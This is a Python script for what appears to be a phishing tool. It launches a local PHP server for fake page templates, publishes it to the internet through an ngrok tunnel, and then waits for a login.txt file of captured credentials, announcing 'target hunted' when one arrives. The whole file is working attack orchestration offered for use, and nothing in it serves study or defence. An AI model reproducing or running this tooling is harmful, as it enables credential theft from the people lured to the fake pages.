import os
import time
from pyngrok import ngrok
from subprocess import Popen


class application:
    url = None

    def __init__(self, template):
        try:
            self.startPhpHost()
            
            self.startNgrokHost(template)
            
            # end-point
            self.disconnectNgrok()
            
        except KeyboardInterrupt:
            self.disconnectNgrok()
            self.killPhpServer()

    def startNgrokHost(self, templatePath):
        self.url = ngrok.connect(8000, "http")
    
        pageURL = self.url.public_url
        os.system("cls")
        
        print("[+] ngrok runing on {}/pages{}".format(pageURL,templatePath["path"]))
        
        time.sleep(5)
        
        self.checkISfileExist("login.txt")
        
    def startPhpHost(self):
        print("[+] start php localhost")
        with open("./src/logs/serv.txt", "w") as serLog:
            Popen(("php", "-S", "localhost:8000", "-t", "./src"), stderr=serLog, stdout=serLog)

    def killPhpServer(self):
        print("[!] php server turm off")
        os.system("taskkill /F /IM php*")

    def disconnectNgrok(self):
        print("[!] ngrok is turn off")
        ngrok.disconnect(self.url)

    def checkISfileExist(self, fileName):
        while True:
            if os.path.isfile("./src/logs/{}".format(fileName)):
                print("[+] target hunted")
                break
            else:
                print("waiting for target ", end="\r")
                time.sleep(0.35)
                print("waiting for target .", end="\r")
                time.sleep(0.35)
                print("waiting for target ..", end="\r")
                time.sleep(0.35)
                print("waiting for target ...", end="\r")
                time.sleep(0.35)
                os.system("cls")
                continue
        return True
